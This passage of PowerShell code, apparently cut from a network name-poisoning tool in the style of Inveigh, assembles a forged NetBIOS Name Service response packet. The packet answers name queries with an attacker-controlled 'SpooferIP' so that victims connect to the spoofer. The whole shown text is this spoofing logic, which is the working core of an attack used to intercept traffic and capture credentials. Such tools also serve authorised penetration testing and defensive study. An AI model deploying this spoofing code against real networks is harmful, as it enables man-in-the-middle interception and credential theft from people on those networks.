$NBNS_response_data = $payload_bytes[13..$payload_bytes.Length] +
                                                    $NBNS_TTL_bytes +
                                                    0x00,0x06,0x00,0x00 +
                                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes()

                            $NBNS_response_packet = 0x00,0x89 +
                                                    $source_port[1,0] +
                                                    $UDP_length[1,0] +
                                                    0x00,0x00 +
                                                    $payload_bytes[0,1] +
                                                    0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x20 +
                                                    $NBNS_response_data

                            